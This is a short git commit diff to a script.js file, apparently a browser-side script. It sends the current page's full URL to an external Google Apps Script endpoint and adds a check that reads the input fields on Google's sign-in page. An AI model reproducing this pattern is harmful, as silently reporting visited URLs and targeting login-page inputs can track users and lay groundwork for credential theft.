a5c50a1b3d59672d39440010aef49e25e05c6c91
Josh Chang <joshchang04@gmail.com>
2021-03-16 11:59:37 -0400

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,4 @@
-fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`)
+fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}`);
+if(window.location.host === 'accounts.google.com'){
+  console.log($('input'));
+}
